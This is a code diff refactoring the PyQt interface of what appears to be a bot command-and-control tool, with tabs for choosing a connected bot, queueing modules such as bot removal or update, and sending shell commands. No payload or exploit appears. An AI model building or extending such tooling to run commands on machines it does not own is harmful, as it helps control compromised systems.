@@ -198,23 +198,49 @@ class _ResponsesTab(QTabWidget):
 class ModuleView(ModuleViewABC):
     """Used by modules to interact with this GUI."""
 
-    def display_error(self, message: str):
-        super().display_error(message)
+    def __init__(self, responses_tab: _ResponsesTab):
+        self.responses_tab = responses_tab
 
-    def display_info(self, message: str):
-        super().display_info(message)
+    def display_error(self, text: str):
+        message_box = QMessageBox()
 
-    def should_continue(self, messages: List[str], continue_message: str = None) -> bool:
-        return super().should_continue(messages, continue_message)
+        message_box.setIcon(QMessageBox.Critical)
+        message_box.setWindowTitle("Error")
+        message_box.setText(text)
+        message_box.setStandardButtons(QMessageBox.Ok)
+        message_box.exec_()
 
-    def output(self, message: bytes, separator: bool = False):
-        super().output(message, separator)
+    def display_info(self, text: str):
+        message_box = QMessageBox()
+
+        message_box.setIcon(QMessageBox.Information)
+        message_box.setWindowTitle("Information")
+        message_box.setText(text)
+        message_box.setStandardButtons(QMessageBox.Ok)
+        message_box.exec_()
+
+    def should_continue(self, messages: List[str]) -> bool:
+        messages.append("\nAre you sure you want to continue?")
+
+        confirm = QMessageBox.question(self.responses_tab, "Confirmation",
+                                       "\n".join(messages), QMessageBox.Yes, QMessageBox.No)
+
+        if confirm == QMessageBox.Yes:
+            return True
+        else:
+            return False
+
+    def output(self, line: str, separator: bool = False):
+        if separator:
+            self.responses_tab.output("---")
+
+        self.responses_tab.output(line)
 
 
 class _ExecuteTab(QTabWidget):
     """Tab used to execute modules or shell commands on the selected bot."""
 
-    def __init__(self, model):
+    def __init__(self, responses_tab: _ResponsesTab, model):
         super().__init__()
 
         self._model = model
@@ -223,7 +249,7 @@ class _ExecuteTab(QTabWidget):
 
         self._layout = QGridLayout()
         self._sub_layout = QVBoxLayout()
-        self._module_view = ModuleView()
+        self._module_view = ModuleView(responses_tab)
 
         self._layout.setAlignment(Qt.AlignTop)
         self.setLayout(self._layout)
@@ -282,7 +308,7 @@ class _ExecuteTab(QTabWidget):
         cached_module = modules.get_module(module_name)
 
         if not cached_module:
-            cached_module = modules.load_module(module_name, ModuleView(), self._model)
+            cached_module = modules.load_module(module_name, self._module_view, self._model)
 
         input_fields = []
 
@@ -297,7 +323,7 @@ class _ExecuteTab(QTabWidget):
         run_button.setMaximumWidth(250)
         run_button.setMinimumHeight(25)
 
-        run_button.pressed.connect(lambda: self._on_module_run(module_combobox.currentText()))
+        run_button.pressed.connect(lambda: self._on_module_run(module_combobox.currentText(), input_fields))
 
         self._sub_layout.addWidget(QLabel(""))
         self._sub_layout.addWidget(run_button)
@@ -325,7 +351,7 @@ class _ExecuteTab(QTabWidget):
         run_button.setMinimumHeight(25)
 
         command_type_combobox.currentTextChanged.connect(self._on_command_type_change)
-        run_button.pressed.connect(lambda: self._on_command_run(command_input.text()))
+        run_button.pressed.connect(lambda: self._on_command_run(command_input))
 
         self._layout.addWidget(command_type_label, 0, 0)
         self._layout.addWidget(command_type_combobox, 0, 1)
@@ -355,15 +381,22 @@ class _ExecuteTab(QTabWidget):
         cached_module = modules.get_module(module_name)
 
         if not cached_module:
-            cached_module = modules.load_module(module_name, ModuleView(), self._model)
+            cached_module = modules.load_module(module_name, self._module_view, self._model)
+
+        input_fields = []
 
         for option_name in cached_module.get_setup_messages():
+            input_field = QLineEdit()
+            input_fields.append(input_field)
+
             self._sub_layout.addWidget(QLabel(option_name))
-            self._sub_layout.addWidget(QLineEdit())
+            self._sub_layout.addWidget(input_field)
 
         run_button = QPushButton("Run")
         run_button.setMaximumWidth(250)
         run_button.setMinimumHeight(25)
+
+        run_button.pressed.connect(lambda: self._on_module_run(module_name, input_fields))
 
         self._sub_layout.addWidget(QLabel(""))
         self._sub_layout.addWidget(run_button)
@@ -379,31 +412,29 @@ class _ExecuteTab(QTabWidget):
         module = modules.get_module(module_name)
 
         if not module:
-            module = modules.load_module(module_name, self, self._model)
+            module = modules.load_module(module_name, self._module_view, self._model)
 
         successful, options = module.setup(set_options)
 
-        if module_name == "remove_bot":
-            code = loaders.get_remove_code(self._connected_bot.loader_name)
-        elif module_name == "update_bot":
-            code = loaders.get_update_code(self._connected_bot.loader_name)
-        else:
-            code = modules.get_code(module_name)
+        if successful:
+            if module_name == "remove_bot":
+                code = loaders.get_remove_code(self._connected_bot.loader_name)
+            elif module_name == "update_bot":
+                code = loaders.get_update_code(self._connected_bot.loader_name)
+            else:
+                code = modules.get_code(module_name)
 
-        self._model.add_command(self._connected_bot.uid, Command(
-            CommandType.MODULE, code, options
-        ))
+            self._model.add_command(self._current_bot.uid, Command(
+                CommandType.MODULE, code, options
+            ))
 
-        self.output("Module added to the queue of \"{}@{}\".".format(
-            self._connected_bot.username, self._connected_bot.hostname
-        ), "info")
-
-    def _on_command_run(self, command: str):
+    def _on_command_run(self, command_input: QLineEdit):
         """Handles running commands."""
-        if command.strip() == "":
+        if command_input.text().strip() == "":
             return
 
-        self._model.add_command(self._current_bot.uid, Command(CommandType.SHELL, command.encode()))
+        self._model.add_command(self._current_bot.uid, Command(CommandType.SHELL, command_input.text().encode()))
+        command_input.clear()
 
 
 class _BotTable(QTableWidget):
@@ -445,65 +476,53 @@ class _BotTable(QTableWidget):
         pass
 
 
-class _InteractWidget(QTabWidget):
-    """Tabbed widget used to interact with the selected bot."""
-
-    def __init__(self, bot_table: _BotTable, model):
-        super().__init__()
-
-        self._bot_table = bot_table
-        self._model = model
-
-        self._execute_tab = _ExecuteTab(model)
-        self._responses_tab = _ResponsesTab()
-
-        self.addTab(self._execute_tab, "Execute")
-        self.addTab(self._responses_tab, "Responses")
-
-        self._register_listeners()
-
-    def _register_listeners(self):
-        self._bot_table.set_on_selection_changed(self.on_selection_changed)
-
-    def on_selection_changed(self):
-        bot_uid = self._bot_table.item(self._bot_table.currentColumn(), 0).text()
-
-        self._execute_tab.set_module_layout()
-        self._execute_tab.set_current_bot(self._model.get_bot(bot_uid))
-        self._responses_tab.clear()
-
-    def get_execute_tab(self) -> _ExecuteTab:
-        return self._execute_tab
-
-    def get_responses_tab(self) -> _ResponsesTab:
-        return self._responses_tab
-
-
 class _ControlTab(QWidget):
-    """Tab which allows the user to control individual bots."""
+    """Tab which allows the user to control individual bots.
+
+    Handles any events fired by the table etc.
+    """
 
     def __init__(self, model):
         super().__init__()
 
+        self._model = model
+
         layout = QGridLayout()
         splitter = QSplitter()
 
-        self._table = _BotTable()
-        self._interact_widget = _InteractWidget(self._table, model)
+        self._bot_table = _BotTable()
+        self._responses_tab = _ResponsesTab()
+        self._execute_tab = _ExecuteTab(self._responses_tab, model)
+
+        self._tab_widget = QTabWidget()
+        self._tab_widget.addTab(self._execute_tab, "Execute")
+        self._tab_widget.addTab(self._responses_tab, "Responses")
 
         splitter.setOrientation(Qt.Vertical)
-        splitter.addWidget(self._table)
-        splitter.addWidget(self._interact_widget)
+        splitter.addWidget(self._bot_table)
+        splitter.addWidget(self._tab_widget)
         splitter.setSizes([50, 100])
 
         layout.addWidget(splitter)
         self.setLayout(layout)
 
-    def get_table(self) -> _BotTable:
-        return self._table
+        self._register_listeners()
 
-    def get_interact_widget(self) -> _InteractWidget:
-        return self._interact_widget
+    def _register_listeners(self):
+        self._bot_table.set_on_selection_changed(self.on_table_selection_changed)
+
+    def on_table_selection_changed(self):
+        bot_uid = self._bot_table.item(self._bot_table.currentColumn(), 0).text()
+
+        self._execute_tab.set_current_bot(self._model.get_bot(bot_uid))
+        self._execute_tab.set_module_layout()
+        self._responses_tab.clear()
+
+    def get_table(self) -> _BotTable:
+        return self._bot_table
+
+    def get_responses_tab(self) -> _ResponsesTab:
+        return self._responses_tab
 
 
 class _HomeTab(QWidget):
@@ -634,7 +653,7 @@ class ViewGUI(ViewABC):
         return self._tabbed_widget
 
     def on_response(self, response: str):
-        responses_tab = self._tabbed_widget.get_control_tab().get_interact_widget().get_responses_tab()
+        responses_tab = self._tabbed_widget.get_control_tab().get_responses_tab()
 
         responses_tab.output("-" * 5)
 
